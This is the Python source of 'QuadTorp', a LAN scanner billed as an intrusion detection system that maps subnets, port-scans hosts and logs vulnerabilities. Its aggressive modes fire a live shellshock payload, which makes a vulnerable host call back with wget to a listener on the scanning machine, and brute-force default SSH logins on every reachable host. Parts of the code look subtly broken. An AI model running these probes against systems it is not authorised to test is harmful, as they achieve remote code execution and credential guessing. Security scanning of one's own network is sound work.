head_banner = r"""
_ __|__ __ _       _         _       _ __ __|__ _
_ __|__      _ __ //QUADRUPLE\\ __ _      __|__ _
_ __|__ __ _      \\ TORPEDO //      _ __ __|__ _
    '                                       '
-- >=_______)                       (_______=< --
  -- - >=________)             (________=< - --
-- ----- - >=________)     (________=< - ----- --
 -- - >=________)               (________=< - --

      __  __|                        |
         |  _ \   __| __ \   _ \  _` |  _ \
         | (   | |    |   |  __/ (   | (   |
        _|\___/ _|    .__/ \___|\__,_|\___/
                     _|
                  ____________-----_'-._
      (______=<    )__|__|__|__       __|
  (______=< _ __ _____________---------_______ _

"""[1:-1]
policy = r"""
_ __ ___   Intrusion Detection Systems   ___ __ _
    |                  -*-                  |
    |_ __  _ -   Savage Security   - _  __ _|. ;
      |                                   |;.:';.
 ; .' |           [ Features ]            | :".;'
":'.' |                                   |;,.|.'
:;':.;|   [ IDS ]-[ SSH Access ]          | ;\|/:
';.": |     |||                           | .| |
'.|.,;|   [ Honeypot ]                    | :| |:      
:\|/; |     ||                            |  | |.
 | |. |   [ Vuln Scans ]-[ Verbose ]      | .| |
:| |: |     |    |          |             |  | |'
.| |  |   [ Alerts ]-[ Exploit ]          |  | |
 | |. |       |           |               |  \_/
'| |  |   [ Speed ]-[ Document ]          |
 | |  |                                   |
 \_/  | [ Passive ]          [ Security ] |
     _|          [   Defcon   ]           |_
_ __|__                                   __|__ _
_ __|__ _ http://paypal.me/russianotter _ __|__ _

  QuadTorp Intrusion Dection System is designed
   to effectively map and log all LAN activity
     while also verbosing and documenting
    vulnerabilities within certain devices

_ __|__ _        - Version Info -       _ __|__ _
    |                                       |

 - 6/13/17 = v1.0   - Established Detection   -
 - 6/15/17 = v1.2   - Enhanced Preformance    -
 - 7/03/17 = v1.2.3 - New Scan Types          -
 - 1/31/18 = v1.3.3 - Enhanced User Interface -
 - 2/05/18 = v1.5.5 - Code Improvements       -
 - 2/08/18 = v1.5.6 - Scan Improvements       -
 - 2/08/18 = v1.5.7 - Major Bug Fixes         -
 - 2/10/18 = v1.6.0 - Dynamic Scanning        -
 - 2/18/18 = v1.7.1 - Memory Improvements     -
 - 2/18/18 = v1.7.2 - Major Bug Fixes         -
 - ?/??/?? = v?.?.? - Honeypot Added          -
 - ?/??/?? = v?.?.? - Speed Tests Added       -
 - ?/??/?? = v?.?.? - More Security Scans     -

_ __|__ _       - Licensing Info -      _ __|__ _
    |                                       |

    THE SOFTWARE IS PROVIDED "AS IS", WITHOUT
     WARRANTY OFANY KIND, EXPRESS OR IMPLIED
  INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
    MERCHANTABILITY, FITNESS FOR A PARTICULAR
  PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL
  THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR 
  ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER 
   IN AN ACTION OF CONTRACT, TORT OR OTHERWISE
  ARISING FROM, OUT OF OR IN CONNECTION WITH THE 
  SOFTWARE OR THE USE OR OTHER DEALINGS IN THE 
                    SOFTWARE

  Copyright (c) Savage Security Technology 2018
 Copyright (c) Quadtorp Intrusion Detection 2018

_ __|__ _                               _ __|__ _
    |                                       |"""
scan_banner = r"""
_ __|__ _          _         _          _ __|__ _
_ __|__      _ __ // TORPEDO \\ __ _      __|__ _
"""
help_info = r"""
_ __|__ _          _         _          _ __|__ _
_ __|__      _ __ // TORPEDO \\ __ _      __|__ _
_ __|__ _         \\ARGUMENTS//         _ __|__ _

:: --ttl :: Connection timeout.

:: --hd :: Hides donation information.

:: -r :: --rate :: Minutes between scans.

:: -s :: --smooth :: Smoothly print scans.

:: -m :: --maxthread :: Limits how many active
threads can be made. More threads means more CPU
usage and battery consumption! Min: 20 Max: 400

:: -a :: --auto-clear :: Clear terminal after x
amount of scans have been made. This will reduce
lag and memory buildup (especially for long-term
scans).

:: -l :: --level :: Select scanning intensity
	level while searching for devices.
- --- ----  -  ---- +[ OPT ]+ ----  -  ---- --- -
..::SECURITY: Find vulnerable devices and report
              any new devices on the network.
..::PASSIVE : Scan basic devices and log info.
..::DEFCON  : Report vulnerable devices and
              actively check for network ports.

:: -n :: --network-level :: Scanning Range.
- --- ----  -  ---- +[ OPT ]+ ----  -  ---- --- -
..::DYNAMIC : Scans all subnet ranges and reports
              all active subnets for future scans
..::LOCAL   : Scans all addresses on the same
              level as the host scanning.
..::MAX     : Scans all addresses.

- --- ----  -  ---- +[ TIP ]+ ----  -  ---- --- -
1. Try to avoid stopping the program while a scan
is actively running. This may lead to large scale
crashes, so instead stop the program when it is
either printing statistics or when it is waiting
to initialize the next scan.

2. To set up custom subnet scan ranges, go to
./networks/<network>/stat.dyn (or make stat.dyn)
and make a Python list containing the first 3
positions of the address followed by %s. When
set in dynamic mode, QuadTorp will use this file
to know where to scan! If you don't know your
active address range, run QuadTorp in max mode.
Example of stat.dyn:
	["192.168.1.%s","192.168.2.%s","192.168.3.%s"]
"""[1:]

agreement = """
   By entering 'y' you agree to the licensing 
 agreement and will uphold to copyright holders
       as the creators of this software.
     Acknowledge Terms & Conditions [y/n]"""

import socket, time, sys, argparse, threading, Queue, logging, random, paramiko, os, requests
from datetime import datetime
import string, SocketServer

if sys.platform == "ios":
	import console
	console.set_font("Menlo",12.1)
if "-h" in sys.argv[1:] or "--help" in sys.argv[1:]:
		print help_info
		sys.exit()
vulns = {
	"shellshock":"CVE-2014-6271",
	"login":"Default Login",
	"https":"No HTTPS"
}
secauth = "DEADBEEF"

parser = argparse.ArgumentParser()
parser.add_argument("-l","--level",
	help="Scanning Intensity. Default: %(default)s",
	default="passive",
	choices=["passive", "security", "defcon"])
parser.add_argument("-n","--network-level",
	help="LAN IP Range. Default: %(default)s",
	default="local",
	choices=["local","dynamic","max"])
parser.add_argument("-v","--verbose",
	help="Document Advanced Findings. Default: %(default)s",
	default=False,
	action="store_true")
parser.add_argument("-r","--rate",
	help="Set time between scans (minutes). Default: %(default)s",
	type=float, default=5)
parser.add_argument("-s","--smooth",
	help="Smoothing printing. Default: %(default)s",
	default=False,
	action="store_true")
parser.add_argument("-m","--maxthread",
	help="Set max amount of threads allowed to run. Default: %(default)s",
	type=int, default=130,
	choices=list(range(20,401)))
parser.add_argument("-a","--auto-clear",
	help="Set amount of scans before terminal clear. Default: %(default)s",
	type=int, default=False,
	choices=list(range(1,101)))
parser.add_argument("--ttl",
	help="Connection Timeout. Default: %(default)s",
	type=int, default=5)
args = parser.parse_args()
socket.setdefaulttimeout(args.ttl)

def loading(rate=0.0007, length=15, msg="", bmsg="", percent=True, amsg="", asyn=False):
	lchr = u"\u2588"
	if len(msg) > 0:
		print msg
	for _ in range(101):
		a = int((_/1000.0)*int(str(length)+"0"))
		p = length-a
		if asyn:
			msg = bmsg + (lchr*a)+(" "*p)+asyn
		else:
			msg = bmsg + (lchr*a)+(" "*p)+" %s"+amsg
		if percent:
			_ = str(_)
		else:
			_ = ""
		if len(str(_)) == 2:
			_ = "0"+str(_)
		elif len(str(_)) == 1:
			_ = "00"+str(_)
		sys.stdout.write("\r"+msg%_)
		time.sleep(rate)
		if random.randint(0,17) == 1:
			time.sleep(rate*random.randint(8,10))
	time.sleep(rate*50)
	print
	return 

class Timer():
	def __init__(self):
		self.start = time.time()
	
	def restart(self):
		self.start = time.time()
	
	def time(self):
		end = time.time()
		m, s = divmod(end - self.start, 60)
		h, m = divmod(m, 60)
		time_str = "%02d:%02d:%02d" % (h, m, s)
		print "..:  Time Elapse  :.." + (" "*9) + "..: %s :.."%time_str

def getauth():
	globals()["_vdevices"] = []
	globals()["secauth"] = "".join(random.sample(string.hexdigits.upper()*10,6))
	return secauth

def shellshock(site, auth=secauth):
	if "http" not in site:
		site = "http://"+site
	conn = requests.session()
	conf = "() { ignored;};/bin/bash -c 'wget http://%s:%s/%s');'" %(netaddr.localhost, _servport, auth)
	header = {"Content-type": "application/x-www-form-urlencoded", "User-Agent":conf}
	res = conn.get(site, data=header, timeout=2)
	conn.close()
	return res.status_code

class TCPListen(SocketServer.BaseRequestHandler):
	def handle(self):
		data = self.request.recv(1024).strip()
		if "" in data:
			del data
			if self.client_address[0] not in _vdevices:
				_vdevices.append(self.client_address[0])
		self.request.sendall("Done.")
	def log_message(self, format, *args):
		return 

class radar():
	
	def __init__(self):
		try:
			self.public = requests.get("http://ip.42.pl/raw",timeout=args.ttl).content
			if len(self.public) > 15:
				self.public = "0.0.0.0"
				print "..: Network :.."+" "*19+"..: OFFLINE :.."
		except:
			self.public = "0.0.0.0"
			print "..: Network :.."+" "*19+"..: OFFLINE :.."
		if self.public not in os.listdir("./networks"):
			os.mkdir("./networks/"+self.public)
			f = open("./networks/"+self.public+"/__init__.py","w")
			f.write(" ")
			f.close()
		self.mdir = "./networks/"+self.public+"/"
	
	def offline(self, ip):
		f = open(self.mdir+ip+".md","a")
		f.write("[%s][%s] *[ Unactive ]*\n"%(ip, time.strftime("%X %x")))
		f.close()
	
	def vuln(self, ip, vuln):
		f = open(self.mdir+ip+".md","a")
		f.write(vuln+"\n")
		f.close()
	
	def autovuln(self, ip, vuln):
		warn = "\r..: %s :.. "%ip
		warn2 = "Detected [%s]" %vulns[vuln]
		warn = warn+(" "*(50-len(warn+warn2)))+warn2
		logging.warning(warn)
		if ip+".md" not in os.listdir(tracking.mdir):
			f = open(tracking.mdir+ip+".md","a")
			f.close()
		st = open(tracking.mdir+ip+".md").read().count(vulns[vuln])/2.0
		if st.is_integer() == True:
			tracking.vuln(ip,"[%s][%s] *[Vulnerable]*\n***Host is vulnerable to %s***" %(time.strftime("%X %x"), ip, vulns[vuln]))
			return True
		stattrack.vuln += 1
		return False
	
	def secured(self, ip, vuln):
		f = open(self.mdir+ip+".md","a")
		f.write(vuln+"\n")
		f.close()
	
	def autosecure(self, ip, vuln):
		if ip+".md" not in os.listdir(tracking.mdir):
			f = open(tracking.mdir+ip+".md","a")
			f.close()
		st = open(tracking.mdir+ip+".md").read().count(vulns[vuln])/2.0
		if st.is_integer() == False:
			warn = "\r..: %s :.. "%ip
			warn2 = "Secured [%s]" %vulns[vuln]
			warn = warn+(" "*(50-len(warn+warn2)))+warn2
			logging.warning(warn)
			tracking.vuln(ip,"[%s][%s] *[  Secure  ]*\n***Host has patched %s***" %(time.estrftime("%X %x"),ip,vulns[vuln]))
	
	def update(self, address, stat="Online"):
		ip = address
		path = self.mdir
		if ip+".md" not in os.listdir(path):
			globals()["_firstscan"] = True
			f = open(path+ip+".md","w")
			f.write("[%s][%s] *[Discovered]*\n"%(ip, time.strftime("%X %x")))
			if stat == "JOINED":
				f.write("**Note: Device Not From Orginal Network**\n")
			f.close()
		else:
			globals()["_firstscan"] = False
			if args.level == "defcon":
				try:
					ports = portscan(address)
				except:
					ports = []
				if len(ports) > 0:
					np = []
					for _ in ports:
						np.append(str(_))
					ports = np
					del np
					f = open(path+ip+".md","a")
					f.write("[%s][ %s ]\n"%(time.strftime("%X %x")," ".join(ports)))
					f.close()
			f = open(path+ip+".md","a")
			f.write("[%s][%s] *[  %s  ]*\n"%(ip, time.strftime("%X %x"),stat))
			f.close()

def startup():
	print scan_banner
	sys.stdout.write("///Network Scanning Protocol")
	sys.stdout.write(" "*(21-(len(args.level)+8)))
	sys.stdout.write("..: %s :..\n"%args.level.upper())
	time.sleep(0.5)
	if args.level == "defcon":
		print "..: Mapping Technique :.." + (" "*8) + "..:  %s :.."%"THREAD"
	else:
		print "..: Mapping Technique :.." + (" "*8) + "..: %s :.."%"THREAD"
	print "..: Networking Levels :.." + (" "*(16-len(args.network_level))) + "..: %s :.."%args.network_level.upper()
	time.sleep(0.1)
	print "..: Network ID :.." + (" "*20) + "..: N01 :.."
	time.sleep(1)
	loads = [
		"Initializing Network",
		"Loading Regulatory",
		"Activating",
		"IDS"
		]
	for _ in loads:
		loading(0.005, bmsg="..: %s :.. "%_, percent=True, length=28-(len(_)), asyn=" ..: %s :..")
		time.sleep(0.1)
	del loads

def print_session():
	print
	sys.stdout.write("///Regulatory Scan Initiated")
	sys.stdout.write(" "*(21-(len(args.level)+8)))
	sys.stdout.write("..: %s :..\n"%args.level.upper())
	time.sleep(0.5)
	loads = [
		"Initializing Scan"
	]
	for _ in loads:
		loading(0.001, bmsg="..: %s :.. "%_, percent=True, length=28-(len(_)), asyn=" ..: %s :..")
		time.sleep(0.1)
	scanid = str(stattrack.scanid)
	while len(scanid) < 3:
		scanid = "0"+scanid
	print "..: Scan Identification :.."+(" "*11)+"..: %s :.." %scanid
	getauth()
	print "..: Security Auth :.."+(" "*14)+"..: %s :.."%secauth
	nl = netaddr.localhost
	print "..: Local Address"+(" "*(24-len(nl)))+"..: "+nl+" :.."
	time.sleep(2)
	if "--hd" not in sys.argv:
		if sys.platform == "ios":
			print "..: Donate :.."," "*20,
			sys.stdout.write("..: ")
			console.write_link("PayPal","https://paypal.me/russianotter")
			sys.stdout.write(" :..")
			print
		else:
			print "..: Donate :.."," "*3,"https://paypal.me/russianotter"
	print "_"*6,"_"*41

def makesock(opt=1):
	try:
		if opt == 1:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
			s.settimeout(args.ttl)
		if opt == 2:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.settimeout(args.ttl)
		return s
	except:
		pass

def connsock():
	s = socket.create_connection
	return s

def sshsock():
	try:
		c = paramiko.SSHClient()
		c.load_system_host_keys()
		c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		return c
	except:
		pass

def auto_update(ip, nid="", stat="", t="ACTIVE"):
	if stat == "on":
		if ip+".md" not in os.listdir(tracking.mdir) and globals()["_firstscan"] == False:
			if args.level in ["security","defcon"]:
				q.put(["ip",nid,ip,"JOINED","alert"])
				tracking.update(ip,"JOINED")
				stattrack.new += 1
			else:
				q.put(["ip",nid,ip,"JOINED"])
				tracking.update(ip,"JOINED")
				stattrack.new += 1
		else:
			q.put(["ip",nid,ip,t])
			tracking.update(ip)
			stattrack.online += 1
	if stat == "off":
		if ip+".md" in os.listdir(tracking.mdir):
			stattrack.offline += 1
			q.put(["ip",nid,ip,"UNACTIVE"])
			tracking.offline(ip)

class hexit():
	def next(self, pre="N"):
		p = hex(self.i)[2:].zfill(len(str(self.i)))
		while len(p) < 5:
			p = "0"+p
		p = pre+p
		self.i += 1
		return p.upper()
		
	def __init__(self,start=1):
		self.i = start
	
	def reset(self):
		self.i = 0

class addressing():
	
	def __init__(self, netlvl=args.network_level):
		self.nlocal = 1
		self.ndyn = 0,1
		self.nmax = [1,1,1]
		try:
			s = makesock()
			s.settimeout(5)
			s.connect(("8.8.8.8", 53))
			self.localhost = s.getsockname()[0]
			s.close()
		except:
			self.localhost = "0.0.0.0"
		self.blocal = ".".join(self.localhost.split(".")[:3])+".x"
		self.bmax = ".".join(self.localhost.split(".")[:1]) + ".%d.%d.%d"
		if tracking.public not in os.listdir("./networks"):
			globals()["_firstscan"] = True
		else:
			globals()["_firstscan"] = False
		if args.network_level == "dynamic":
			path = "./networks/"+tracking.public+"/"
			if "stat.dyn" not in os.listdir(path) and len(os.listdir(path)) > 2:
				dyn = []
				for _ in os.listdir(path):
					if _.count(".") > 3:
						net = _[:-3].split(".")
						net = ".".join(net[:3])+".%s"
						dyn.append(net)
				ndyn = []
				for _ in dyn:
					if _ not in ndyn:
						ndyn.append(_)
				f = open(path+"stat.dyn","w")
				f.write(str(ndyn))
				f.close()
				self.bdyn = ndyn
			elif len(os.listdir(path)) > 2:
				self.bdyn = eval(open(path+"stat.dyn").read())
			else:
				print "..: Notice :.. Max level scan is required before\ndynamic scanning can be activated!"
				print "..: Level Switched :.."+(" "*14)+"..:  MAX  :.."
				args.network_level = "max"
	
	def next_local(self):
		if self.nlocal == 255:
			return False
		address = self.blocal.replace("x", str(self.nlocal))
		self.nlocal += 1
		return address
	
	def next_max(self):
		if self.nmax.count(255) == 3:
			return False
		if self.nmax[1] == 255:
			self.nmax[0:] = self.nmax[0]+1,1,1
		if self.nmax[2] == 255:
			self.nmax[1:] = self.nmax[1]+1,1
		address = self.bmax%tuple(self.nmax)
		self.nmax[2] += 1
		return address
	
	def next_dyn(self):
		try:
			if self.ndyn[1] > 254:
				self.ndyn = self.ndyn[0]+1,0
			if self.ndyn[0] > len(self.bdyn):
				return False
			address = self.bdyn[self.ndyn[0]] % self.ndyn[1]
			self.ndyn = self.ndyn[0],self.ndyn[1]+1
			return address
		except:
			return False

def portdetect(ip, port):
	s = makesock(2)
	s.settimeout(2)
	try:
		v = s.connect_ex((ip,port))
		if v == 0:
			return port
		else:
			return False
	except:
		return False

def portscan(ip, rng=[21,22,25,53,80,145,2000,
8080,443,8080]+list(range(137,140))):
	ports = []
	for _ in rng:
		p = portdetect(ip,_)
		if p:
			ports.append(p)
	return ports

class statistics():
	
	def __init__(self, network):
		self.network = network
		self.totalnodes = 0
		self.online = 0
		self.offline = 0
		self.new = 0
		self.vuln = 0
		self.scanid = 0
	
	def autoout(self, val):
		val = str(val)
		sys.stdout.write("..: ")
		dist = 11-len(val)
		for _ in range(dist):
			sys.stdout.write("-")
			time.sleep(0.05)
		for _ in str(val):
			sys.stdout.write(_)
			time.sleep(0.1)
		sys.stdout.write(" :..\r\n")
		
	def print_st(self):
		time.sleep(args.ttl)
		print
		print "///Scan Report Diagnostics    ..: Data Logged :.."
		print "\r..:  IPs Scanned  :.."+(" "*9),
		self.autoout(self.totalnodes)
		print "\r..: Vulnerable IP :.."+(" "*9),
		self.autoout(self.vuln)
		print "\r..:  New Devices  :.."+(" "*9),
		self.autoout(self.new)
		print "\r..:  Offline IPs  :.."+(" "*9),
		self.autoout(self.offline)
		print "\r..:  Active Addr  :.."+(" "*9),
		self.autoout(self.online)
		if args.verbose:
			timekeeper.time()
		print
	
	def reset(self):
		self.totalnodes = 0
		self.online = 0
		self.offline = 0
		self.vuln = 0
		self.new = 0

def _drone():
	while True:
		try:
			data = q.get()
			if data == "exit":
				break
			if data[0] == "ip":
				pad = (17-len(data[2]))/2
				pad = [pad,pad]
				if pad[0]+pad[1]+len(data[2]) != 17:
					pad = pad[0],pad[0]+1
				out = data[1]+"|"+(" ."*5)+" ["+" "*pad[0] + data[2] + " "*pad[1]+"]"
				pad = (10-len(data[3]))/2
				out += "["+(" "*pad)+data[3]+(" "*pad)+"]"
				if "alert" in data:
					logging.warning("\r"+out)
					if args.smooth:
						time.sleep(0.01)
				else:
					print out
					if args.smooth:
						time.sleep(0.01)
			q.task_done()
		except:
			break

def vulnlog():
	try:
		while True:
			while _inprog == True:
				pass
			try:
				if len(_vdevices) > 0:
					for _ in _vdevices:
						if _ != netaddr.localhost:
							tracking.autovuln(_,"shellshock")
							_vdevices.pop(_vdevices.index(_))
			except Exception as e:
				break
	except:
		pass

def start_loggers(bots=1):
	if "_msgrdrone" not in threading._active:
		t = threading.Thread(target=_drone)
		t.daemon = True
		t.name = "_msgrdrone"
		t.start()
	if "_vulnlog" not in threading._active:
		t = threading.Thread(target=vulnlog)
		t.daemon = True
		t.name = "_vulnlog"
		t.start()

def vulncheck(ip, scanports, state, nid):
	isvuln1, isvuln2 = False,False
	lauth = secauth
	if 80 in scanports:
		for _ in ["/cgi-sys/entropysearch.cgi","/cgi-sys/defaultwebpage.cgi","/cgi-mod/index.cgi","/cgi-bin/test.cgi","/cgi-bin-sdb/printenv"]:
			try:
				resp = shellshock(ip+_,lauth)
				if resp == 200:
					state = "VULN"
					isvuln1 = True
					break
			except Exception as e:
				pass
		if not isvuln1:
			tracking.autosecure(ip,"shellshock")
		if 443 not in scanports:
			tracking.autovuln(ip,"https")
		else:
			tracking.autosecure(ip,"https")
	
	if 22 in scanports:
		for user in ["admin","root","user","guest"]:
			if isvuln2:
				break
			for pasw in ["password","admin","root"]:
				if isvuln2:
					break
				try:
					client = sshsock()
					client.connect(ip, port=22, username=user, password=pasw, timeout=args.ttl)
					client.close()
					state = "VULN"
					isvuln2 = True
					v = tracking.autovuln(ip,"login")
					if v:
						tracking.vuln(ip,"***Host has default SSH Login Credentials (%s:%s)***" %(user, pasw))
					stattrack.vuln += 1
				except Exception as e:
					pass
		if not isvuln2:
			tracking.autosecure(ip,"login")
	
	if state == "ACTIVE":
		auto_update(ip,nid,"on")
	elif state == "HTTP":
		auto_update(ip,nid,"on",t=state)
	elif state == "UNACTIVE":
		auto_update(ip,nid, stat="off",t=state)
	elif state == "VULN":
		q.put(["ip",nid,ip,"VULN","alert"])

def check_node(ip, nid, lvl=args.level):
	try:
		stattrack.totalnodes += 1
		if lvl == "passive":
			try:
				pt,pro = 1,"ACTIVE"
				if args.verbose:
					pt,pro = 80,"HTTP"
				s = connsock()
				s((ip,pt))
				auto_update(ip,nid,"on",t=pro)
				return True
			except socket.error as e:
				if e.errno == 61:
					auto_update(ip,nid,"on")
					return True
				elif e.message == "timed out":
					auto_update(ip,nid, stat="off",t="UNACTIVE")
				else:
					return False
			except:
				return False
		
		if lvl in ["defcon","security"]:
			try:
				scanports = portscan(ip)
			except:
				scanports = []
			state = ""
			try:
				s = connsock()
				s((ip,80))
				state = "HTTP"
			except socket.error as e:
				if e.errno == 61:
					state = "ACTIVE"
				elif e.message == "timed out":
					state = "UNACTIVE"
			except Exception as e:
				pass
			t = threading.Thread(target=vulncheck, args=(ip, scanports, state, nid,))
			t.daemon = True
			t.start()
	except Exception as e:
		pass

def scan(setting=args.level):
	if tracking.public == "0.0.0.0":
		q.put(["ip"," wan0 ","OFFLINE","WIFI"])
	while 1:
		while threading.active_count() > args.maxthread:
			pass
		if args.network_level == "local":
			ip = netaddr.next_local()
		elif args.network_level == "max":
			ip = netaddr.next_max()
		elif args.network_level == "dynamic":
			ip = netaddr.next_dyn()
		nid = ip_count.next()
		if ip == False:
			break
		t = threading.Thread(target=check_node, args=(ip,nid,))
		t.daemon = True
		t.start()
		if args.smooth:
			time.sleep(0.005)
	q.join()

def start_server(lhost):
	globals()["_servport"] = 11337
	for _ in range(5):
		try:
			serv = SocketServer.TCPServer((lhost, 8080), TCPListen)
			serv.allow_reuse_address = True
			try:
				serv.serve_forever()
			except:
				serv.server_close()
				break
		except Exception as e:
			pass
		globals()["_servport"] += _

def toggle():
	globals()["_inprog"] = not _inprog

if __name__ == "__main__":
	globals()["_vdevices"] = []
	globals()["_inprog"] = False
	tracking = radar()
	netaddr = addressing()
	if "ss_http" not in threading._active:
		t = threading.Thread(target=start_server, args=(netaddr.localhost,))
		t.name = "ss_http"
		t.daemon = True
		t.start()
	print head_banner
	if "recent.md" not in os.listdir("./"):
		print policy
		print agreement.upper(),
		if raw_input().lower() == "y":
			print "\n  Thank you acknowlging the terms & conditions".upper()
			rcf = open("recent.md","w")
			rcf.write(" ")
			rcf.close()
			print """
_ __|__ _                               _ __|__ _
    |                                       |"""
		else:
			print "\n               Please acknowledge\n      the terms & conditions before running".upper()
			print """
_ __|__ _                               _ __|__ _
    |                                       |"""
			sys.exit(0)
	socket.setdefaulttimeout(args.ttl)
	q = Queue.Queue()
	startup()
	threadnote = threading.active_count()
	if threadnote == 1:
		threadnote += 1
	else:
		threadnote += 2
	timekeeper = Timer()
	stattrack = statistics(netaddr.localhost)
	start_loggers()
	while True:
		netaddr = addressing()
		stattrack.scanid += 1
		if args.auto_clear:
			if stattrack.scanid > args.auto_clear:
				if sys.platform == "ios":
					console.clear()
				else:
					os.system("clear")
		ip_count = hexit()
		print_session()
		if args.verbose:
			timekeeper.restart()
		toggle()
		scan()
		toggle()
		while threading.active_count() > threadnote:
			time.sleep(0.5)
		stattrack.print_st()
		stattrack.reset()
		end = time.time()+60*args.rate
		while time.time() < end:
			try:
				pass
			except:
				print "..: Scanning Successfully Stopped :.."
				q.put("exit")
				sys.exit(0)
	print "..: Scanning Successfully Stopped :.."
	q.put("exit")
